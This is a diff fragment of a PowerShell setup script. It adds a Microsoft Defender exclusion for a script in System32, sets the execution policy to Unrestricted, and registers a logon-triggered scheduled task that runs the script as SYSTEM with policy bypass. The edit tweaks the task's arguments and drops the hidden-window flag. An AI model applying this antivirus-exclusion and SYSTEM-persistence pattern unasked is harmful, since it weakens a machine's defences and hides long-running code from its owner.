@@ -8,7 +8,7 @@ Add-MpPreference -ExclusionPath "C:\Windows\System32\ddrcc.ps1"
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope LocalMachine
 # add schedule to start ddrcc.ps1
 # add variables for scheduler
-$action = New-ScheduledTaskAction -Execute powershell.exe -Arguments "-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File C:\Windows\System32\ddrcc.ps1"
+$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -ExecutionPolicy Bypass -File "C:\Windows\System32\ddrcc.ps1"'
 $trigger = New-ScheduledTaskTrigger -AtLogOn
 $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 # register scheduled task
